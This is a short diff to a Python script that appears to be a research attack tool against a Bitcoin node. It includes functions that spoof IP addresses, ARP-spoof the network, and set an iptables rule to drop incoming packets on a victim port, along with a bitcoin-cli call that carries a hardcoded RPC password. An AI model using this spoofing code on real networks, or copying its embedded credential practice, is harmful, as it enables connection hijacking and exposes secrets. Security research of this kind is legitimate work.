@@ -48,7 +48,7 @@ def ip_alias(ip_address):
 
 def terminal(cmd):
 	# print('\n> '+cmd)
-	print(os.popen(cmd).read())
+	return os.popen(cmd).read()
 
 def bitcoin(cmd):
 	return os.popen('./../../src/bitcoin-cli -rpcuser=cybersec -rpcpassword=kZIdeN4HjZ3fp9Lge4iezt0eJrbjSi8kuSuOHeUkEUbQVdf09JZXAAGwF3R5R2qQkPgoLloW91yTFuufo7CYxM2VPT7A5lYeTrodcLWWzMMwIrOKu7ZNiwkrKOQ95KGW8kIuL1slRVFXoFpGsXXTIA55V3iUYLckn8rj8MZHBpmdGQjLxakotkj83ZlSRx1aOJ4BFxdvDNz0WHk1i2OPgXL4nsd56Ph991eKNbXVJHtzqCXUbtDELVf4shFJXame -rpcport=8332 ' + cmd).read()
@@ -167,11 +167,12 @@ def initialize_fake_connection(src_ip, dst_ip):
 	##########
 	src_port = attacker_port
 	dst_port = victim_port
+	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
 
 	#terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST --destination {dst_ip} -j DROP')
-	terminal(f'iptables -t raw -A PREROUTING -p tcp --dport {dst_port} -j DROP')
+	print('Setting iptables')
+	print(terminal(f'iptables -t raw -A PREROUTING -p tcp --dport {dst_port} -j DROP'))
 
-	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
 
 	mac_address = get_mac_address(network_interface)
 	arp_spoof(src_ip, mac_address)
